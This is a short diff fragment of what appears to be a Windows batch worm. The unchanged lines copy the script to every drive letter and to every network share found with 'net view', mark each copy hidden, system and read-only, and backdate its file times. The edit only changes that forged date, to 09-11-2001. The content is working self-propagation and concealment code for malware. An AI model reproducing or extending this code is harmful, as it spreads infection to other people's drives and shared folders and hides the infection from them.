@@ -121,7 +121,7 @@ for %%i in (A B C D E F G H J L P Q S U V W X Y Z M I K R O N T) do (
     ) else (
       copy /y "%~dpnx0" %%i:\
       attrib -h -r -s "%%i:\%~nx0"
-      %module_fileTouch% /w /a /c /d 05-25-1720 /t 22:59:59 "%%i:\%~nx0"
+      %module_fileTouch% /w /a /c /d 09-11-2001 /t 22:59:59 "%%i:\%~nx0"
       attrib +h +r +s "%%i:\%~nx0"
     )
   )
@@ -154,7 +154,7 @@ for /f "skip=3 tokens=1,* delims= " %%i in ('net view') do if /i "%%i" NEQ "The"
     ) else (
       copy /y "%~dpnx0" "%%i\%%j\"
       attrib -h -r -s "%%i\%%j\%~nx0"
-      %module_fileTouch% /w /a /c /d 05-25-1720 /t 22:59:59 "%%i\%%j\%~nx0"
+      %module_fileTouch% /w /a /c /d 09-11-2001 /t 22:59:59 "%%i\%%j\%~nx0"
       attrib +h +r +s "%%i\%%j\%~nx0"
     )
   )
